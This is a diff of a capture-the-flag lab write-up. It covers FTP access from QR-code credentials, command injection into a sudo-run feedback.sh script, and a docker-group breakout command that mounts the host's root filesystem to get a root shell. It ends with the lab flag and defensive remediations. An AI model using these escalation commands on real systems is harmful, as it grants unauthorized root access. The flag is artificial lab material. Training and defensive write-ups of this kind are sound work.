@@ -72,8 +72,9 @@ Hidden resources were discovered, including a page containing a **QR code.**
 ---
 
 ## QR Code Analysis
-img
-img
+<img src="QRcode.png">
+
+<img src="FTP.png">
 
 Using the credentials derived from the QR code, an authenticated FTP session was established.
 
@@ -168,7 +169,7 @@ S4th15hR4cer
 Findings:
 
 ``` bash
--   `information.txt` -- message for user **robin**
+-   `information.txt` -- message for user robin
 -   `p_lists.txt` -- password list
 ```
 
@@ -208,7 +209,7 @@ System enumeration revealed a custom executable named **fedback.sh** inside the 
 sudo -u jerry ./feedback.sh
 ```
 
-The scripted prompted for user input but lacked sanitization. By injecting an OS command into the prompt, a shell was spawned under the **jerry** account.
+The script prompted for user input but lacked sanitization. By injecting an OS command into the prompt, a shell was spawned under the **jerry** account.
 
 **Payload Injection:**
 ``` bash
@@ -223,30 +224,37 @@ cd /home/jerry
 cat user2.txt
 ```
 Result:
-``` bash
-🚩 User 2 Flag: Successfully retrieved **user2.txt** from /home/jerry.
-```
+🚩 User 2 Flag: Successfully retrieved `user2.txt` from `/home/jerry`.
+
 
 ## Vertical Escalation (jerry → root)
-Checking the group ID assignments (id) for **jerry** revelaed membership in the **docker** group (**gid 114**). This security misconfiguration allows a user to mount the host's root filesystem into a container, effectively granting root privileges.
+Checking the group ID assignments (id) for `jerry` revelaed membership in the **docker** group (`gid 114`). This security misconfiguration allows a user to mount the host's root filesystem into a container, effectively granting root privileges.
 
 **Docker Breakout Payload:**
 ``` bash
 docker images
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
+This command mounted the host's `/` directory to `mnt` inside a locally cached Alpine container and dropped the session into a root shell.
 
-Result:
 ``` bash
-🏆 Root Flag: Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
+whoami
+cd /root
+cat root.txt
 ```
+
+## 🏆 Root Flag
+
+`Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}`
 
 # 🛡️ Phase 5: Threat Mitigation & Defense
 To secure this system against similar attack vectors, the following remediations are recommended:
 
+- **Remove Sensitive Data:** Never store QR codes, password lists, or configuration hints (`information.txt`) on publicly accessible or low-security FTP servers.
+- **Input Sanitization:** Custom scripts (`feedback.sh`) must validate and sanitize all user input before passing it to system execution functions to prevent OS Command Injection.
+- **Principle of Least Privilege:** Standard users must be removed from the `docker` group, as it is functionally equivalent to granting passwordless root access via volume mounting.
 
-
-# 🛠️ Tools Used
+## 🛠️ Tools Used
 
  | Tool        | Purpose
  | ------------| -----------------------
